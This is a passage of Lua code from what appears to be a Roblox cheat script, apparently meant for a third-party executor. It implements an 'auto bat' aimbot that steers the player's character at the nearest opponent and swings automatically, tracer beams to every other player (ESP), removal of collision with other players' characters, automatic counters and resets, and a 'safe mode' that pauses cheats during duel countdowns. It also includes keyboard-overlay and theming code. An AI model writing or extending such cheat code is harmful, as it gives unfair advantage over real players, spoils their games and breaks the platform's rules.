mouseWheel.frame = wheel; mouseWheel.basePosition = wheel.Position; Buttons.Mouse3 = mouseWheel; local zone = math.min(math.floor(width / 2) - 7, math.floor((height - topPart) / 2) - 6) local ring = new("Frame", { Name = "TrackZone", BackgroundTransparency = 1, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromOffset(math.floor(width / 2), topPart + math.floor((height - topPart) / 2)), Size = UDim2.fromOffset(zone * 2, zone * 2), ZIndex = 3, Parent = mouseBody, }, { new("UICorner", { CornerRadius = UDim.new(1, 0) }) }) new("UIStroke", {
Color = THEME.line, Thickness = 1, Transparency = 0.8, ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = ring, }) local trackerDot = new("Frame", { Name = "Pointer", BackgroundColor3 = THEME.pressFill, BackgroundTransparency = 0.2, BorderSizePixel = 0, AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5), Size = UDim2.fromOffset(8, 8), ZIndex = 4, Parent = ring, }, { new("UICorner", { CornerRadius = UDim.new(1, 0) }) }) local trackerRadius = zone - 4 _kbOverlay.buttons = Buttons local function isTyping()
return CONFIG.hideWhileTyping and UIS:GetFocusedTextBox() ~= nil end local function releaseAll() for _, cell in pairs(Buttons) do cell:setActive(false) end if mouseWheel.frame and mouseWheel.basePosition then mouseWheel.frame.Position = mouseWheel.basePosition end trackerDot.Position = UDim2.fromScale(0.5, 0.5) end local function resolveId(input) local kind = input.UserInputType if kind == Enum.UserInputType.Keyboard then return input.KeyCode.Name elseif kind == Enum.UserInputType.MouseButton1 then return "Mouse1" elseif kind == Enum.UserInputType.MouseButton2 then return "Mouse2"
elseif kind == Enum.UserInputType.MouseButton3 then return "Mouse3" end return nil end _kbTrack(UIS.InputBegan:Connect(function(input) if isTyping() then return end local id = resolveId(input); local cell = id and Buttons[id] if cell then cell:setActive(true) end end)) _kbTrack(UIS.InputEnded:Connect(function(input) local id = resolveId(input) local cell = id and Buttons[id] if cell then cell:setActive(false) end end)) _kbTrack(UIS.InputChanged:Connect(function(input) if input.UserInputType ~= Enum.UserInputType.MouseWheel or isTyping() then return end
local up = input.Position.Z > 0; mouseWheel:flash(CONFIG.wheelFlash); local base = mouseWheel.basePosition; mouseWheel.frame.Position = base + UDim2.fromOffset(0, up and -3 or 3) task.delay(CONFIG.wheelFlash, function() if mouseWheel.frame then kTween(mouseWheel.frame, 0.08, { Position = base }) end end) end)) local pointerAccum, pointerCurrent, pointerLast = Vector2.zero, Vector2.zero, nil _kbTrack(UIS.InputChanged:Connect(function(input) if input.UserInputType ~= Enum.UserInputType.MouseMovement then return end local delta = Vector2.new(input.Delta.X, input.Delta.Y)
if delta.Magnitude < 0.001 then local position = Vector2.new(input.Position.X, input.Position.Y) if pointerLast then delta = position - pointerLast end pointerLast = position else pointerLast = nil end pointerAccum = pointerAccum + delta end)) _kbTrack(RunService.RenderStepped:Connect(function(step) local frame = math.clamp(step, 1 / 240, 1 / 15) local velocity = pointerAccum / frame; pointerAccum = Vector2.zero; local target = Vector2.zero; local speed = velocity.Magnitude if speed > 1 then
local amount = 1 - math.exp(-speed / CONFIG.trackSpeed); target = velocity.Unit * math.clamp(amount, 0, 1) end local rate = target.Magnitude > pointerCurrent.Magnitude and CONFIG.trackAttack or CONFIG.trackRelease; pointerCurrent = pointerCurrent + (target - pointerCurrent) * math.clamp(rate * frame * 60, 0, 1) if pointerCurrent.Magnitude < 0.004 then pointerCurrent = Vector2.zero end trackerDot.Position = UDim2.new( 0.5, pointerCurrent.X * trackerRadius, 0.5, pointerCurrent.Y * trackerRadius ) trackerDot.BackgroundTransparency = 0.2 - math.min(pointerCurrent.Magnitude, 1) * 0.2 end)) do
local dragInput, startMouse, startOffset _kbTrack(header.InputBegan:Connect(function(input) local kind = input.UserInputType if kind ~= Enum.UserInputType.MouseButton1 and kind ~= Enum.UserInputType.Touch then return end local view = screen.AbsoluteSize; dragInput = input; startMouse = Vector2.new(input.Position.X, input.Position.Y); startOffset = Vector2.new(root.Position.X.Scale * view.X, root.Position.Y.Scale * view.Y) end)) _kbTrack(UIS.InputChanged:Connect(function(input) if not dragInput then return end local moving if dragInput.UserInputType == Enum.UserInputType.Touch then
moving = (input == dragInput) else moving = (input.UserInputType == Enum.UserInputType.MouseMovement) end if not moving then return end local view = screen.AbsoluteSize; local target = startOffset + (Vector2.new(input.Position.X, input.Position.Y) - startMouse); root.Position = UDim2.fromScale(target.X / view.X, target.Y / view.Y) end)) _kbTrack(UIS.InputEnded:Connect(function(input) if dragInput and input == dragInput then dragInput = nil end end)) end _kbTrack(UIS.InputBegan:Connect(function(input) if input.KeyCode ~= CONFIG.toggleKey or isTyping() then return end
screen.Enabled = not screen.Enabled if not screen.Enabled then releaseAll() end end)) _kbTrack(UIS.WindowFocusReleased:Connect(releaseAll)) pcall(function() local env = (type(getgenv) == "function" and getgenv()) or _G env.__VersincKeyboardOverlay = { destroy = F.stopKeyboardOverlay, screen = screen } end) end function F.findMedusa() local c = LP.Character if not c then return nil end for _, t in ipairs(c:GetChildren()) do if t:IsA("Tool") then local n = t.Name:lower() if n:find("medusa") or n:find("head") or n:find("stone") then return t end end end local bp = LP:FindFirstChild("Backpack")
if bp then for _, t in ipairs(bp:GetChildren()) do if t:IsA("Tool") then local n = t.Name:lower() if n:find("medusa") or n:find("head") or n:find("stone") then return t end end end end return nil end function F.useMedusaCounter() if S.medusaDebounce then return end if MEDUSA_COOLDOWN > (tick() - S.medusaLastUsed) then return end local c = LP.Character if not c then return end S.medusaDebounce = true; local med = F.findMedusa() if not med then S.medusaDebounce = false; return end if med.Parent ~= c then local hum2 = c:FindFirstChildOfClass("Humanoid") if hum2 then hum2:EquipTool(med) end end
pcall(function() med:Activate() end) S.medusaLastUsed = tick(); S.medusaDebounce = false end function F.onAnchorChanged(part) return part:GetPropertyChangedSignal("Anchored"):Connect(function() if part.Anchored and part.Transparency == 1 then if S.medusaResetEnabled then if cursedInstaReset then cursedInstaReset() end elseif S.medusaCounterEnabled then F.useMedusaCounter() end end end) end function F.setupMedusa(char) for _, c in pairs(Conns.anchor) do pcall(function() c:Disconnect() end) end Conns.anchor = {} if not char then return end for _, part in ipairs(char:GetDescendants()) do
if part:IsA("BasePart") then table.insert(Conns.anchor, F.onAnchorChanged(part)) end end table.insert(Conns.anchor, char.DescendantAdded:Connect(function(part) if part:IsA("BasePart") then table.insert(Conns.anchor, F.onAnchorChanged(part)) end end)) end function F.stopMedusaCounter() for _, c in pairs(Conns.anchor) do pcall(function() c:Disconnect() end) end Conns.anchor = {} end function F.refreshMedusaWatch() if S.medusaCounterEnabled or S.medusaResetEnabled then F.setupMedusa(LP.Character) else F.stopMedusaCounter() end end
 BAT_COUNTER_SLAP_LIST={"Bat","Slap","Iron Slap","Gold Slap","Diamond Slap","Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap","Nuclear Slap","Galaxy Slap","Glitched Slap"} function F.findBatForCounter() local c=LP.Character;if not c then return nil end; local bp=LP:FindFirstChildOfClass("Backpack") for _,name in ipairs(BAT_COUNTER_SLAP_LIST) do local t=c:FindFirstChild(name) or (bp and bp:FindFirstChild(name));if t then return t end end for _,ch in ipairs(c:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end
if bp then for _,ch in ipairs(bp:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end end return nil end function F.swingBatForCounter(bat,char) local hum2=char:FindFirstChildOfClass("Humanoid") if bat.Parent~=char then if hum2 then pcall(function() hum2:EquipTool(bat) end) end;task.wait(0.05) end local remote=bat:FindFirstChildOfClass("RemoteEvent") or bat:FindFirstChildOfClass("RemoteFunction") if remote and remote:IsA("RemoteEvent") then pcall(function() remote:FireServer() end);task.wait(0.15);pcall(function() remote:FireServer() end)
else pcall(function() bat:Activate() end);task.wait(0.15);pcall(function() bat:Activate() end) end end S.startBatCounter=function() if Conns.batCounter then return end Conns.batCounter=RunService.Heartbeat:Connect(function() if not S.batCounterEnabled then return end if batCounterDebounce then return end local char=LP.Character;if not char then return end; local hum2=char:FindFirstChildOfClass("Humanoid");if not hum2 then return end; local st=hum2:GetState() if st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll or st==Enum.HumanoidStateType.FallingDown then
batCounterDebounce=true  end end) end S.stopBatCounter=function() if Conns.batCounter then Conns.batCounter:Disconnect();Conns.batCounter=nil end batCounterDebounce=false end function F.getAutoBatTarget()
local char = LP.Character
if not char then return nil end
local root = char:FindFirstChild("HumanoidRootPart")
if not root then return nil end
local closest, minDist = nil, math.huge
for _, plr in ipairs(Players:GetPlayers()) do
if plr ~= LP and plr.Character then
local targetRoot = plr.Character:FindFirstChild("HumanoidRootPart")
local targetHum = plr.Character:FindFirstChildOfClass("Humanoid")
if targetRoot and targetHum and targetHum.Health > 0 then
local dist = (targetRoot.Position - root.Position).Magnitude
if dist < minDist then minDist = dist; closest = targetRoot end
end
end
end
return closest
end
local function zezinAutoBatSwing()
if S.autoSwingEnabled == false then return end
pcall(function()
local char = LP.Character
if not char then return end
local currentTool = char:FindFirstChildOfClass("Tool")
if currentTool then
local name = currentTool.Name:lower()
if not (name:find("bat") or name:find("slap")) then return end
end
local bat = F.findBatForCounter()
if not bat then return end
local hum = char:FindFirstChildOfClass("Humanoid")
if bat.Parent ~= char and hum then pcall(function() hum:EquipTool(bat) end) end
pcall(function() bat:Activate() end)
end)
end
S.resetAutoBatMotion = function()
local char = LP.Character
local root = char and char:FindFirstChild("HumanoidRootPart")
local hum = char and char:FindFirstChildOfClass("Humanoid")
if root then
root.AssemblyLinearVelocity = Vector3.new(0, -0.1, 0)
root.AssemblyAngularVelocity = Vector3.zero
end
if hum then
hum.AutoRotate = true
hum.PlatformStand = false
pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)
end
end
_autoTPWasEnabled = false
S.enableAutoBat = function()
if S.autoLeftEnabled then S.autoLeftEnabled=false; if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end; F.stopAutoLeft() end
if S.autoRightEnabled then S.autoRightEnabled=false; if S.autoRightSetVisual then S.autoRightSetVisual(false) end; F.stopAutoRight() end
if S.autoTPEnabled then _autoTPWasEnabled=true; F.stopAutoTP(); if VS.setAutoTPVisual then VS.setAutoTPVisual(false) end else _autoTPWasEnabled=false end
S.autoBatEquippedThisRun=false
S.autoBatEnabled=true
local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
if hum then hum.AutoRotate = false end
end
S.disableAutoBat = function()
S.autoBatEnabled=false
S.autoBatEquippedThisRun=false
if S.resetAutoBatMotion then S.resetAutoBatMotion() end
if _autoTPWasEnabled then
_autoTPWasEnabled=false
S.autoTPEnabled=true
if VS.setAutoTPVisual then VS.setAutoTPVisual(true) end
F.startAutoTP()
end
F.destroyProxy()
end
function F.queueAutoLeftStart()
if not F.safeModeTryStart() then S.autoLeftEnabled=false; if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end; return end
S.autoLeftEnabled=true
if S.autoRightEnabled then S.autoRightEnabled=false; if S.autoRightSetVisual then S.autoRightSetVisual(false) end; F.stopAutoRight() end
if S.autoBatEnabled then S.disableAutoBat(); if S.autoBatSetVisual then S.autoBatSetVisual(false) end end
F.startAutoLeft()
end
function F.queueAutoRightStart()
if not F.safeModeTryStart() then S.autoRightEnabled=false; if S.autoRightSetVisual then S.autoRightSetVisual(false) end; return end
S.autoRightEnabled=true
if S.autoLeftEnabled then S.autoLeftEnabled=false; if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end; F.stopAutoLeft() end
if S.autoBatEnabled then S.disableAutoBat(); if S.autoBatSetVisual then S.autoBatSetVisual(false) end end
F.startAutoRight()
end
function F.queueAutoBatStart()
if S.autoBatV2Enabled and F.stopBatV2 then F.stopBatV2() end
if not F.safeModeTryStart() then if S.autoBatSetVisual then S.autoBatSetVisual(false) end; return end
if S.autoLeftEnabled then S.autoLeftEnabled=false; if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end; F.stopAutoLeft() end
if S.autoRightEnabled then S.autoRightEnabled=false; if S.autoRightSetVisual then S.autoRightSetVisual(false) end; F.stopAutoRight() end
S.enableAutoBat()
end
RunService.RenderStepped:Connect(function()
if not S.autoBatEnabled then return end
local char = LP.Character
if not char then return end
local root = char:FindFirstChild("HumanoidRootPart")
local hum = char:FindFirstChildOfClass("Humanoid")
if not root or not hum or hum.Health <= 0 then return end
if hum.AutoRotate then hum.AutoRotate = false end
if not char:FindFirstChildOfClass("Tool") then
local bat = F.findBatForCounter()
if bat then pcall(function() hum:EquipTool(bat) end) end
end
local target = F.getAutoBatTarget()
if not target then
root.AssemblyAngularVelocity = Vector3.zero
return
end
local targetVel = target.AssemblyLinearVelocity
local myPos = root.Position
local targetPos = target.Position
local predictPos = targetPos + targetVel * 0.14 + target.CFrame.LookVector * 0.3
local direction = predictPos - myPos
local flatDir = Vector3.new(direction.X, 0, direction.Z)
if flatDir.Magnitude > 0 then flatDir = flatDir.Unit else flatDir = Vector3.zero end
local desiredHeight = targetPos.Y + 3.7
local yVel = (desiredHeight - myPos.Y) * 19.5 + targetVel.Y * 0.8
if hum.FloorMaterial ~= Enum.Material.Air then yVel = math.max(yVel, 13) end
yVel = math.clamp(yVel, -70, 110)
local desiredVel = Vector3.new(flatDir.X * S.AUTO_BAT_SPEED, yVel, flatDir.Z * S.AUTO_BAT_SPEED)
root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.8)
local predictTime = math.clamp(targetVel.Magnitude / 150, 0.05, 0.2)
local predictedPos = targetPos + targetVel * predictTime
local toPredict = predictedPos - myPos
if toPredict.Magnitude > 0.1 then
local goalCF = CFrame.lookAt(myPos, predictedPos)
local diffCF = root.CFrame:Inverse() * goalCF
local rx, ry, rz; do local __m = {diffCF:ToEulerAnglesXYZ()}; rx = __m[1]; ry = __m[2]; rz = __m[3]; end
rx = math.clamp(rx, -2.5, 2.5)
ry = math.clamp(ry, -2.5, 2.5)
rz = math.clamp(rz, -2.5, 2.5)
root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(rx * 42, ry * 42, rz * 42))
end
if (root.Position - target.Position).Magnitude <= 8 then zezinAutoBatSwing() end
end) LP.CharacterAdded:Connect(function(char) F.destroyProxy() task.wait(0.5); F.setupSpeedIndicator(char) pcall(function() RagdollGrab.start(char) end) if S.medusaCounterEnabled or S.medusaResetEnabled then F.setupMedusa(char) end if S.batCounterEnabled then S.startBatCounter() end if S.unwalkEnabled then task.wait(0.5);F.startUnwalk() end if S.antiRagdollEnabled then
task.wait(0.3); F.startAntiRagdoll() end if infJumpEnabled then task.wait(0.2); F.startInfJump() end if aimbotEnabled then task.wait(0.3); startAimbot() end if tpBatEnabled then task.wait(0.3); startTPBat() end pcall(function() if K7.headlessEnabled then task.wait(0.2); K7.applyHeadless(char, true) end if K7.korbloxEnabled then task.wait(0.2); K7.applyKorblox(char, true) end if S.medusaResetEnabled or S.medusaCounterEnabled then task.wait(0.2); F.setupMedusa(char) end if K7.bodyLockEnabled then task.wait(0.2); K7.startBodyLock() end
if K7.animPackEnabled then task.wait(0.3); K7.applyAnimPack(K7.animPackName) end if K7.lineESPEnabled or K7.speedESPEnabled then task.wait(0.5); K7.refreshESP() end end) end) if LP.Character then F.setupSpeedIndicator(LP.Character); pcall(function() RagdollGrab.start(LP.Character) end) end _G.AceNoPlayerCollisionState = _G.AceNoPlayerCollisionState or {connections = {}, running = false} function F.setOtherPlayerCollision(state) for _, plr in ipairs(Players:GetPlayers()) do if plr ~= LP and plr.Character then for _, part in ipairs(plr.Character:GetDescendants()) do if part:IsA("BasePart") then pcall(function() part.CanCollide = state end) end end
end end end function F.enableNoPlayerCollision() local st = _G.AceNoPlayerCollisionState if st.running then return end S.noPlayerCollisionEnabled = true; st.running = true for _, conn in ipairs(st.connections or {}) do pcall(function() conn:Disconnect() end) end st.connections = {}; F.setOtherPlayerCollision(false) table.insert(st.connections, LP.CharacterAdded:Connect(function() task.wait(0.5) if S.noPlayerCollisionEnabled then F.setOtherPlayerCollision(false) end end)) table.insert(st.connections, Players.PlayerAdded:Connect(function(plr) local c = plr.CharacterAdded:Connect(function()
task.wait(0.5) if S.noPlayerCollisionEnabled then F.setOtherPlayerCollision(false) end end) table.insert(st.connections, c) end)) local collisionScanElapsed = 0 table.insert(st.connections, RunService.Heartbeat:Connect(function(dt) if not S.noPlayerCollisionEnabled then return end collisionScanElapsed = collisionScanElapsed + (dt or 0) if collisionScanElapsed < 0.25 then return end collisionScanElapsed = 0 for _, plr in ipairs(Players:GetPlayers()) do if plr ~= LP and plr.Character then for _, part in ipairs(plr.Character:GetDescendants()) do
if part:IsA("BasePart") and part.CanCollide == true then pcall(function() part.CanCollide = false end) end end end end end)) end function F.disableNoPlayerCollision() local st = _G.AceNoPlayerCollisionState; S.noPlayerCollisionEnabled = false if not st.running then return end st.running = false for _, conn in ipairs(st.connections or {}) do pcall(function() conn:Disconnect() end) end st.connections = {}; F.setOtherPlayerCollision(true) end function F.safeModeGetCountdownLabel() local ok, label; do local __m = {pcall(function() local pg = LP:FindFirstChild("PlayerGui") if not pg then return nil end
local a = pg:FindFirstChild("DuelsMachineTopFrame"); local b = a and a:FindFirstChild("DuelsMachineTopFrame"); local t = b and b:FindFirstChild("Timer") return t and t:FindFirstChild("Label") end)}; ok = __m[1]; label = __m[2]; end return (ok and label) or nil end function F.safeModeCountdownNumber(text) local t = tostring(text or ""):upper():gsub("^%s+", ""):gsub("%s+$", "") if t == "GO" or t == "START" or t == "READY" then return true end local n = tonumber(t) return n ~= nil and n >= 0 and n <= 10 end function F.safeModeInDuelCountdown() local label = F.safeModeGetCountdownLabel()
return label and F.safeModeCountdownNumber(label.Text) or false end function F.safeModeHoldingBrainrot() local ok, val; do local __m = {pcall(function() return LP:GetAttribute("Stealing") end)}; ok = __m[1]; val = __m[2]; end if ok and val == true then return true end local char = LP.Character if not char then return false end local ok3, val3; do local __m = {pcall(function() return char:GetAttribute("Stealing") end)}; ok3 = __m[1]; val3 = __m[2]; end if ok3 and val3 == true then return true end if F.isCarryingBrainrot and F.isCarryingBrainrot(char) then return true end return false end function F.safeModeIsLocked() if not S.safeModeEnabled then return false end
return F.safeModeInDuelCountdown() or F.safeModeHoldingBrainrot() end function F.safeModeForceStop(reason) local stopped = false if tpBatEnabled and stopTPBat then pcall(function() stopTPBat() end) if VS.setTPBatVisual then pcall(VS.setTPBatVisual, false) end stopped = true end if aimbotEnabled and stopAimbot then pcall(function() stopAimbot() end) stopped = true end if S.autoBatEnabled then S.autoBatEnabled = false if S.disableAutoBat then pcall(S.disableAutoBat) end if S.autoBatSetVisual then pcall(S.autoBatSetVisual, false) end stopped = true end if S.autoLeftEnabled then
S.autoLeftEnabled = false if F.stopAutoLeft then F.stopAutoLeft() end if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end stopped = true end if S.autoRightEnabled then S.autoRightEnabled = false if F.stopAutoRight then F.stopAutoRight() end if S.autoRightSetVisual then S.autoRightSetVisual(false) end stopped = true end if stopped then print("[Zombie.Vs] Safe Mode:", reason or "SAFE MODE LOCK") end end function F.safeModeTryStart() if F.safeModeIsLocked() then F.safeModeForceStop("SAFE MODE LOCK") return false end return true end if not _G.__VersincSafeModeMonitor then
_G.__VersincSafeModeMonitor = true RunService.Heartbeat:Connect(function() if S.safeModeEnabled and F.safeModeIsLocked() then F.safeModeForceStop("SAFE MODE LOCK") end end) end function F.setupDeathReset() end _G.AceAutoResetOnMed = _G.AceAutoResetOnMed or { conns = {}, enabled = false, medTriggered = false, lastFire = 0, cooldown = 2.25 } function F.autoResetShouldFire(part) local state = _G.AceAutoResetOnMed if not state or not state.enabled then return false end if state.medTriggered then return false end if tick() - (state.lastFire or 0) < (state.cooldown or 2.25) then return false end
if not part or not part.Parent then return false end if part:FindFirstAncestorOfClass("Tool") or part:FindFirstAncestorOfClass("Accessory") then return false end return part.Anchored == true and part.Transparency == 1 end function F.autoResetFireOnce(part) if not F.autoResetShouldFire(part) then return end local state = _G.AceAutoResetOnMed; state.medTriggered = true; state.lastFire = tick() task.delay(2.3, function() if state.enabled and cursedInstaReset then pcall(cursedInstaReset) end end) end function F.stopAutoResetOnMed() local state = _G.AceAutoResetOnMed if not state then return end
for _, conn in ipairs(state.conns or {}) do pcall(function() conn:Disconnect() end) end state.conns = {}; state.medTriggered = false end function F.startAutoResetOnMed(char) local state = _G.AceAutoResetOnMed if not state then return end F.stopAutoResetOnMed(); state.medTriggered = false char = char or LP.Character if not char then return end for _, part in ipairs(char:GetDescendants()) do if part:IsA("BasePart") then table.insert(state.conns, part:GetPropertyChangedSignal("Anchored"):Connect(function() F.autoResetFireOnce(part) end)) F.autoResetFireOnce(part) end end
table.insert(state.conns, char.DescendantAdded:Connect(function(part) if part:IsA("BasePart") then table.insert(state.conns, part:GetPropertyChangedSignal("Anchored"):Connect(function() F.autoResetFireOnce(part) end)) F.autoResetFireOnce(part) end end)) table.insert(state.conns, char.AncestryChanged:Connect(function(_, parent) if not parent then state.medTriggered = false end end)) end function F.setAutoResetOnMed(on) S.autoResetOnMedEnabled = on and true or false; _G.AceAutoResetOnMed.enabled = S.autoResetOnMedEnabled if S.autoResetOnMedEnabled then F.startAutoResetOnMed(LP.Character) else
F.stopAutoResetOnMed() end end if not _G.__VersincMedFlingCharConn then _G.__VersincMedFlingCharConn = true LP.CharacterAdded:Connect(function(char) if S.autoResetOnMedEnabled then task.wait(0.25); F.startAutoResetOnMed(char) end end) end S._tracerFolder = nil; S._tracerConn = nil function F.clearTracers() if S._tracerFolder then pcall(function() S._tracerFolder:Destroy() end) end S._tracerFolder = nil end function F.refreshTracers() if not S.showTracerEnabled then F.clearTracers(); return end local myRoot = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
if not myRoot then return end local folder = S._tracerFolder if not folder or not folder.Parent then folder = Instance.new("Folder"); folder.Name = "VersincTracers"; folder.Parent = workspace; S._tracerFolder = folder end local att0 = myRoot:FindFirstChild("VersincTracerAtt") if not att0 or att0.Parent ~= myRoot then if att0 then pcall(function() att0:Destroy() end) end att0 = Instance.new("Attachment"); att0.Name = "VersincTracerAtt"; att0.Parent = myRoot end local alive = {} for _, plr in ipairs(Players:GetPlayers()) do if plr ~= LP and plr.Character then
local root = plr.Character:FindFirstChild("HumanoidRootPart"); local hum = plr.Character:FindFirstChildOfClass("Humanoid") if root and hum and hum.Health > 0 then alive[plr.Name] = true; local beam = folder:FindFirstChild("TR_" .. plr.Name); local att1 = root:FindFirstChild("VersincTracerAtt") if not att1 or att1.Parent ~= root then if att1 then pcall(function() att1:Destroy() end) end att1 = Instance.new("Attachment"); att1.Name = "VersincTracerAtt"; att1.Parent = root end if not beam then
beam = Instance.new("Beam"); beam.Name = "TR_" .. plr.Name; beam.Width0 = 0.12; beam.Width1 = 0.08; beam.FaceCamera = true; beam.LightEmission = 0.65; beam.LightInfluence = 0; beam.Segments = 1; beam.Color = ColorSequence.new((S and S.themeColor) or (COLORS and COLORS.accent) or Color3.fromRGB(255, 255, 255)); beam.Transparency = NumberSequence.new(0.12); beam.Parent = folder end beam.Attachment0 = att0; beam.Attachment1 = att1 end end end for _, ch in ipairs(folder:GetChildren()) do if ch:IsA("Beam") then local name = ch.Name:match("^TR_(.+)$") if name and not alive[name] then
pcall(function() ch:Destroy() end) end end end end function F.setShowTracer(on) S.showTracerEnabled = on and true or false if S._tracerConn then pcall(function() S._tracerConn:Disconnect() end); S._tracerConn = nil end if S.showTracerEnabled then F.refreshTracers(); local acc = 0 S._tracerConn = RunService.Heartbeat:Connect(function(dt) acc = acc + (dt or 0) if acc < 0.2 then return end acc = 0; F.refreshTracers() if S._tracerFolder then for _, ch in ipairs(S._tracerFolder:GetDescendants()) do if ch:IsA("Beam") then ch.Enabled = true end end end end) else F.clearTracers() end end
S._ragdollCdConn = nil; S._ragdollCdCharConn = nil; S._ragdollCdEnd = 0; S._ragdollCdLabel = nil;  RAGDOLL_CD_SECONDS = 2.6 function F.stopRagdollCountdown() if S._ragdollCdConn then S._ragdollCdConn:Disconnect(); S._ragdollCdConn = nil end if S._ragdollCdCharConn then S._ragdollCdCharConn:Disconnect(); S._ragdollCdCharConn = nil end if S._ragdollCdLabel then S._ragdollCdLabel.Visible = false; S._ragdollCdLabel.Text = "" end if S._ragdollCdBillboard then pcall(function() S._ragdollCdBillboard:Destroy() end) S._ragdollCdBillboard = nil; S._ragdollCdLabel = nil end end
function F.ensureRagdollCdLabel(char) char = char or LP.Character; local head = char and (char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart")) if not head then return nil end pcall(function() local pg = LP:FindFirstChild("PlayerGui") local old = pg and pg:FindFirstChild("VersincRagdollCD") if old then old:Destroy() end end) if S._ragdollCdBillboard then pcall(function() S._ragdollCdBillboard:Destroy() end) S._ragdollCdBillboard = nil; S._ragdollCdLabel = nil end
local bb = Instance.new("BillboardGui"); bb.Name = "VersincRagdollCD"; bb.Adornee = head; bb.Size = UDim2.new(0, 90, 0, 40); bb.StudsOffset = Vector3.new(0, 5.8, 0); bb.AlwaysOnTop = true; bb.MaxDistance = 200; bb.Enabled = false; bb.Parent = head; S._ragdollCdBillboard = bb; local bg = Instance.new("Frame"); bg.Name = "BG"; bg.Size = UDim2.new(1, 0, 1, 0); bg.BackgroundColor3 = Color3.fromRGB(12, 12, 14); bg.BackgroundTransparency = 0.15; bg.BorderSizePixel = 0; bg.Visible = false; bg.Parent = bb; local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 10); c.Parent = bg; local st = Instance.new("UIStroke"); st.Color = Color3.fromRGB(180, 180, 185); st.Thickness = 1; st.Transparency = 0.4; st.Parent = bg; local lbl = Instance.new("TextLabel"); lbl.Name = "CD"; lbl.Size = UDim2.new(1, -6, 1, -4); lbl.Position = UDim2.new(0, 3, 0, 2); lbl.BackgroundTransparency = 1; lbl.Text = ""; lbl.TextColor3 = Color3.fromRGB(245, 245, 247); lbl.Font = Enum.Font.GothamBlack; lbl.TextSize = 18; lbl.TextStrokeTransparency = 0.35; lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0); lbl.Visible = false; lbl.Parent = bg; S._ragdollCdLabel = lbl
return lbl end function F.hookRagdollCountdown(char) F.stopRagdollCountdown() if not S.ragdollCountdownEnabled then return end char = char or LP.Character if not char then return end local hum = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 4) if not hum then return end F.ensureRagdollCdLabel(char); S._ragdollCdEnd = 0 local function showCd(on) local bb = S._ragdollCdBillboard; local lbl = S._ragdollCdLabel if bb then bb.Enabled = on and true or false end if lbl then lbl.Visible = on and true or false if lbl.Parent then lbl.Parent.Visible = on and true or false end
if not on then lbl.Text = "" end end end local function beginCountdown() S._ragdollCdEnd = tick() + RAGDOLL_CD_SECONDS; showCd(true) end local function isRag() local st = hum:GetState() return hum.PlatformStand or st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll or st == Enum.HumanoidStateType.FallingDown end S._ragdollCdCharConn = hum.StateChanged:Connect(function(_, newState) if newState == Enum.HumanoidStateType.Physics or newState == Enum.HumanoidStateType.Ragdoll or newState == Enum.HumanoidStateType.FallingDown then beginCountdown() end end)
S._ragdollCdConn = RunService.RenderStepped:Connect(function() if not S.ragdollCountdownEnabled then F.stopRagdollCountdown(); return end local lbl = S._ragdollCdLabel if not lbl or not lbl.Parent then F.ensureRagdollCdLabel(LP.Character); lbl = S._ragdollCdLabel if not lbl then return end showCd(false) end if isRag() and S._ragdollCdEnd <= tick() then beginCountdown() end local left = math.max(0, S._ragdollCdEnd - tick()) if left > 0 then showCd(true); lbl.Text = string.format("%.1fs", left) if left <= 0.8 then lbl.TextColor3 = Color3.fromRGB(255, 255, 255) elseif left <= 1.5 then
lbl.TextColor3 = Color3.fromRGB(210, 210, 215) else lbl.TextColor3 = Color3.fromRGB(180, 180, 185) end else showCd(false) end end) showCd(false) end function F.setRagdollCountdown(on) S.ragdollCountdownEnabled = on and true or false if S.ragdollCountdownEnabled then F.hookRagdollCountdown(LP.Character) else F.stopRagdollCountdown() end end if not _G.__VersincRagdollCdChar then _G.__VersincRagdollCdChar = true LP.CharacterAdded:Connect(function(char) if S.ragdollCountdownEnabled then task.wait(0.3); F.hookRagdollCountdown(char) end end) end
-- Apply the chosen color to every owned GUI, including dynamically created text.
function F.applyWaveThemeObject(d,col)
    local parent = d.Parent
    while parent do
        if parent.Name == "ColorThemePicker" then return end
        parent = parent.Parent
    end
    if d:IsA("TextLabel") or d:IsA("TextButton") or d:IsA("TextBox") then
        if d.TextColor3 ~= col then d.TextColor3 = col end
        if not d:GetAttribute("WaveTextThemeBound") then
            d:SetAttribute("WaveTextThemeBound",true)
            d:GetPropertyChangedSignal("TextColor3"):Connect(function()
                local chosen = S.themeColor
                if chosen and d.Parent and d.TextColor3 ~= chosen then d.TextColor3 = chosen end
            end)
        end
        if d:IsA("TextBox") then d.PlaceholderColor3 = col end
    end
    if d:IsA("UIStroke") then d.Color = col
    elseif d:IsA("ScrollingFrame") then d.ScrollBarImageColor3 = col end
    if d:IsA("Frame") or d:IsA("ScrollingFrame") or d:IsA("TextButton") or d:IsA("TextBox") then
        if d.Name == "Fill" or d.Name == "StatusDot" or d:GetAttribute("ThemePillOn") then
            d.BackgroundColor3 = col
        elseif d.BackgroundTransparency < 1 then
            local factor = d:GetAttribute("VisualState") == "on" and 0.35 or 0.12
            d.BackgroundColor3 = Color3.new(col.R*factor,col.G*factor,col.B*factor)
        end
    end
end
function F.registerWaveThemeRoot(root)
    _G.__ZombieWaveThemeRoots = _G.__ZombieWaveThemeRoots or {}
